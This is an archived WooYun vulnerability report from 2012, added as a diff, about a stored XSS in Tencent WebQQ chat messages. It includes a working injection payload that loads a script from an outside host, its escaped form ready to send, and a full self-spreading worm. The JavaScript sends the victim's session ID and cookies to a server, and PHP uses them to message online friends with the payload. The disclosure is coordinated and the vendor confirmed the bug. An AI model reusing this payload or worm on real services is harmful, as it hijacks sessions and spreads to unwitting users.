@@ -1,0 +1,361 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯WEBQQ聊天功能XSS - 附带消息蠕虫代码  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯WEBQQ聊天功能XSS - 附带消息蠕虫代码  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-06-19 15:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-09：	细节向普通白帽子公开<br/>
+									2012-07-19：	细节向实习白帽子公开<br/>
+									2012-08-03：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">由于找到百度Hi的一个存储型Xss, 不好意思的，于是我又联想到了WEBQQ，然后就找到了。。<br />
+<br />
+这个挺有意思吧～～ 附带一个通过聊天消息传播的蠕虫代码。 </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 首先上传一个正常的图片，抓包并发送消息，看输入。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191528558d2edfad7ee33cddd7ba36498f5c7700.jpg" target="_blank"><img src="../images/191528558d2edfad7ee33cddd7ba36498f5c7700.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 然后再接收方，打开调试工具，看输出～<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191529124bb42da5d4d3bfdae4c084c5444ddbbf.jpg" target="_blank"><img src="../images/191529124bb42da5d4d3bfdae4c084c5444ddbbf.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 可以看到，输入和输出有同样的内容。。<br />
+<br />
+<br />
+<br />
+4. 试了下输入处可以在后面添加内容，接着我们就是想着如何构造输入，导致畸形输出。<br />
+<br />
+<br />
+<br />
+5. 常规的 &quot;,&gt; 试都没试，这个要是没过滤的话。。就太低级的了。。<br />
+<br />
+<br />
+<br />
+6. 首先测试 &amp;quot;&amp;gt; 这个经常导致存储型Xss的组合。 结果被过滤了。。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19152925f88d2e377a75ad0d3269269075f1367f.jpg" target="_blank"><img src="../images/19152925f88d2e377a75ad0d3269269075f1367f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 接着，既然是json数据，我们用\u0022\u003e来表示 &quot;&gt; 应该也是可以的，结果应该服务器端解析错误。返回的retcode不等于0.<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19152937b9ab2977e8bfe25df470767dea049fa1.jpg" target="_blank"><img src="../images/19152937b9ab2977e8bfe25df470767dea049fa1.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. ******  重点在这里 ******<br />
+<br />
+<br />
+<br />
+由于WEBQQ的消息内容是动态推送的，我就联想到了， xxx.innerHTML=&quot;\u0022\u003e&quot; 会输出为 &quot;&gt;，我做以下猜测。<br />
+<br />
+   \\u0022\\u003e --&gt;(经过服务器端会输出为)--&gt; \u0022\u003e --&gt;(经过innerHTML输出为) &quot;&gt;<br />
+<br />
+<br />
+<br />
+9. 基于上面这个想法，我们做了下面的测试，结果。。。侧漏了<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1915301753ab18b6a5a300c26a7578b327026882.jpg" target="_blank"><img src="../images/1915301753ab18b6a5a300c26a7578b327026882.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 接着后就好办了。构造利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&quot;onerror=&quot;$H.loadScript(&#039;http://www.toolmao.com/tool/qqworm.js&#039;)//</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+--&gt;unicode编码转换<br />
+<br />
+<br />
+<br />
+</p><pre><code>\u0022\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003D\u0022\u0024\u0048\u002e\u006c\u006f\u0061\u0064\u0053\u0063\u0072\u0069\u0070\u0074\u0028\u0027\u0068\u0074\u0074\u0070\u003A\u002f\u002f\u0077\u0077\u0077\u002e\u0074\u006f\u006f\u006c\u006d\u0061\u006f\u002e\u0063\u006f\u006d\u002f\u0074\u006f\u006f\u006c\u002f\u0071\u0071\u0077\u006f\u0072\u006d\u002e\u006a\u0073\u0027\u0029\u002f\u002f</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+--&gt; 然后将 \ 全部转换为 \\ ，并且加入到发送的数据r字段的 offpic参数处。<br />
+<br />
+<br />
+<br />
+</p><pre><code>{&quot;to&quot;:3591158871,&quot;face&quot;:471,&quot;content&quot;:&quot;[[\&quot;offpic\&quot;,\&quot;/b770c7e7-8032-42f9-9a75-50a69cb316d2\\u0022\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003D\\u0022\\u0024\\u0048\\u002e\\u006c\\u006f\\u0061\\u0064\\u0053\\u0063\\u0072\\u0069\\u0070\\u0074\\u0028\\u0027\\u0068\\u0074\\u0074\\u0070\\u003A\\u002f\\u002f\\u0077\\u0077\\u0077\\u002e\\u0074\\u006f\\u006f\\u006c\\u006d\\u0061\\u006f\\u002e\\u0063\\u006f\\u006d\\u002f\\u0074\\u006f\\u006f\\u006c\\u002f\\u0071\\u0071\\u0077\\u006f\\u0072\\u006d\\u002e\\u006a\\u0073\\u0027\\u0029\\u002f\\u002f\&quot;,\&quot;icon_appblue.png\&quot;,49756],\&quot;\\n\&quot;,[\&quot;font\&quot;,{\&quot;name\&quot;:\&quot;test\&quot;,\&quot;size\&quot;:\&quot;10\&quot;,\&quot;style\&quot;:[0,0,0],\&quot;color\&quot;:\&quot;000000\&quot;}]]&quot;,&quot;msg_id&quot;:80810004,&quot;clientid&quot;:&quot;1181874&quot;,&quot;psessionid&quot;:&quot;8368046764001e636f6e6e7365727665725f77656271714031302e3132382e36362e3131320000529000001be102620083d4486d0000000a4033414761756d5857636d00000028eb9e99a6355d08861632d2769b7b12c0c73d2bbec1da7df3b88da7a914a97d3f5549e4aed22a2137&quot;}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+11. 发送利用代码，接收方调用我们的外部文件。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/191530311d07fd3b4d2423ffe510a8121c618f21.jpg" target="_blank"><img src="../images/191530311d07fd3b4d2423ffe510a8121c618f21.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+12. 为了进一步演示此漏洞危害， 编写了以下蠕虫代码进行测试。<br />
+<br />
+<br />
+<br />
+qqworm.js<br />
+<br />
+<br />
+<br />
+</p><pre><code>//alert(&quot;a web qq worm by gainover&quot;);<br />
+$H.loadScript(&quot;http://localhost:8080/bugtest/qqworm.php?sid=&quot;+EQQ.getPsessionid()+&quot;&amp;cid=&quot;+EQQ.Model.ChatMsg.getClientidFromRpc()+&quot;&amp;cookie=&quot;+encodeURIComponent(document.cookie));</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+qqworm.php<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?<br />
+	error_reporting(1);<br />
+	include &quot;./_class/xmlhttp.php&quot;;<br />
+	//echo &quot;web qq worm test&quot;;<br />
+	$clientid=$_GET[&quot;cid&quot;];<br />
+	$psessionid=$_GET[&quot;sid&quot;];<br />
+	$ck=$_GET[&quot;cookie&quot;];<br />
+	function getQQ(){<br />
+		//get online friends<br />
+		global $clientid,$psessionid,$ck;<br />
+		$req=new XMLHTTP();<br />
+		$req-&gt;open(&quot;http://d.web2.qq.com/channel/get_online_buddies2?clientid=&quot;.$clientid.&quot;&amp;psessionid=&quot;.$psessionid,&quot;GET&quot;);<br />
+		$req-&gt;addsendheader(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;);<br />
+		$req-&gt;addsendheader(&quot;Referer&quot;,&quot;http://d.web2.qq.com/proxy.html?v=20110331002&amp;callback=1&amp;id=2&quot;);<br />
+		$req-&gt;addsendheader(&quot;Origin&quot;,&quot;http://d.web2.qq.com&quot;);<br />
+		$req-&gt;addsendheader(&quot;Cookie&quot;,$ck);<br />
+		//$req-&gt;addsendheader(&quot;Connection&quot;,&quot;Close&quot;);<br />
+		$req-&gt;send();<br />
+		$content=$req-&gt;resbody();<br />
+		$req-&gt;close();<br />
+		echo $content;<br />
+		if($content){<br />
+			$tmpobj=json_decode($content,true);<br />
+			if($tmpobj[&quot;retcode&quot;]==0){<br />
+				$sendqq=array();<br />
+				//从列表里将webQQ的用户加入<br />
+				$qqlist=$tmpobj[&quot;result&quot;];<br />
+				foreach($qqlist as $qq){<br />
+					//limited in test QQ number.<br />
+					if(($qq[&quot;uin&quot;]==&quot;1974530220&quot;||$qq[&quot;uin&quot;]==&quot;1049174111&quot;)){<br />
+						$sendqq[]=$qq;<br />
+					}<br />
+				} <br />
+				//var_dump($sendqq);<br />
+				sendToQQ($sendqq);<br />
+			}else{<br />
+				echo &quot;window.___tmp=&#039;&quot;.$tmpobj[&quot;retcode&quot;].&quot;&#039;;&quot;;<br />
+			}<br />
+		}else{<br />
+			echo &quot;window.___tmp=&#039;error&#039;;&quot;;<br />
+		}<br />
+	}<br />
+	function sendMsg($qqobj){<br />
+		global $clientid,$psessionid,$ck;<br />
+		$qq=$qqobj[&quot;uin&quot;];<br />
+		$ctype=$qqobj[&quot;client_type&quot;];<br />
+		$req=new XMLHTTP();<br />
+		$req-&gt;open(&quot;http://d.web2.qq.com/channel/send_buddy_msg2&quot;,&quot;POST&quot;);<br />
+		$req-&gt;addsendheader(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;);<br />
+		$req-&gt;addsendheader(&quot;Referer&quot;,&quot;http://d.web2.qq.com/proxy.html?v=20110331002&amp;callback=1&amp;id=2&quot;);<br />
+		$req-&gt;addsendheader(&quot;Origin&quot;,&quot;http://d.web2.qq.com&quot;);<br />
+		$req-&gt;addsendheader(&quot;Cookie&quot;,$ck);<br />
+		//$req-&gt;addsendheader(&quot;Connection&quot;,&quot;Close&quot;);<br />
+		$sendstr=&quot;{\&quot;to\&quot;:&quot;.$qq.&quot;,\&quot;face\&quot;:471,\&quot;content\&quot;:\&quot;[\\\&quot;show me some money!!\\\&quot;,[\\\&quot;font\\\&quot;,{\\\&quot;name\\\&quot;:\\\&quot;test\\\&quot;,\\\&quot;size\\\&quot;:\\\&quot;10\\\&quot;,\\\&quot;style\\\&quot;:[0,0,0],\\\&quot;color\\\&quot;:\\\&quot;000000\\\&quot;}]]\&quot;,\&quot;msg_id\&quot;:21910004,\&quot;clientid\&quot;:\&quot;&quot;.$clientid.&quot;\&quot;,\&quot;psessionid\&quot;:\&quot;&quot;.$psessionid.&quot;\&quot;}&quot;;<br />
+		if($ctype==41){<br />
+			//if friend use web qq<br />
+			$sendstr=&quot;{\&quot;to\&quot;:&quot;.$qq.&quot;,\&quot;face\&quot;:471,\&quot;content\&quot;:\&quot;[[\\\&quot;offpic\\\&quot;,\\\&quot;/40dcbb28-3ec0-4300-8613-41be547b6eeb\\\\u0022\\\\u006f\\\\u006e\\\\u0065\\\\u0072\\\\u0072\\\\u006f\\\\u0072\\\\u003D\\\\u0022\\\\u0024\\\\u0048\\\\u002e\\\\u006c\\\\u006f\\\\u0061\\\\u0064\\\\u0053\\\\u0063\\\\u0072\\\\u0069\\\\u0070\\\\u0074\\\\u0028\\\\u0027\\\\u0068\\\\u0074\\\\u0074\\\\u0070\\\\u003A\\\\u002f\\\\u002f\\\\u0077\\\\u0077\\\\u0077\\\\u002e\\\\u0074\\\\u006f\\\\u006f\\\\u006c\\\\u006d\\\\u0061\\\\u006f\\\\u002e\\\\u0063\\\\u006f\\\\u006d\\\\u002f\\\\u0074\\\\u006f\\\\u006f\\\\u006c\\\\u002f\\\\u0071\\\\u0071\\\\u0077\\\\u006f\\\\u0072\\\\u006d\\\\u002e\\\\u006a\\\\u0073\\\\u0027\\\\u0029\\\\u002f\\\\u002f\\\&quot;,\\\&quot;icon5.png\\\&quot;,1844],\\\&quot;\\\&quot;,\\\&quot;\\\&quot;,[\\\&quot;font\\\&quot;,{\\\&quot;name\\\&quot;:\\\&quot;Arial\\\&quot;,\\\&quot;size\\\&quot;:\\\&quot;10\\\&quot;,\\\&quot;style\\\&quot;:[0,0,0],\\\&quot;color\\\&quot;:\\\&quot;339966\\\&quot;}]]\&quot;,\&quot;msg_id\&quot;:21910004,\&quot;clientid\&quot;:\&quot;&quot;.$clientid.&quot;\&quot;,\&quot;psessionid\&quot;:\&quot;&quot;.$psessionid.&quot;\&quot;}&quot;;<br />
+		}<br />
+		//echo $sendstr;<br />
+		$req-&gt;addsendlist(&quot;r&quot;,$sendstr);<br />
+		$req-&gt;addsendlist(&quot;clientid&quot;,$clientid);<br />
+		$req-&gt;addsendlist(&quot;psessionid&quot;,$psessionid);<br />
+		$req-&gt;send();<br />
+		$content=$req-&gt;resbody();<br />
+		$req-&gt;close();<br />
+		echo $content;<br />
+	}<br />
+	function sendToQQ($qqlist){<br />
+		foreach($qqlist as $qq){<br />
+			//echo $qq.&quot;&lt;br/&gt;&quot;;<br />
+			sendMsg($qq);<br />
+			sleep(10);<br />
+		}<br />
+	}<br />
+	//main function <br />
+	getQQ();<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+13. 本蠕虫代码中为测试用，对被传播的在线用户进行了限制，其工作原理及真实演示效果见漏洞证明。  </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">找到一个WEBQQ在线的用户，发送消息，当用户点开消息后，恶意代码将被执行，受害用户会 在自己【毫不知情的情况下】向在线的好友发送虚假消息，如果其好友也是WEBQQ在线，将被发送带有恶意代码的消息。～～<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19153110f0b74a6327ca06c1dc03551017eacb02.png" target="_blank"><img src="../images/19153110f0b74a6327ca06c1dc03551017eacb02.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对服务器端逻辑不是很清楚， 消息代码里，对 \ 进行过滤？ 仅猜测。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-08487" title="腾讯WEBQQ聊天功能XSS - 附带消息蠕虫代码">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-06-19 16:13</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">thanks，感谢反馈，我们正在跟进修复中~</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="8487";
+var bugRating="2";
+var myRating="";
+var ratingCount="21";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
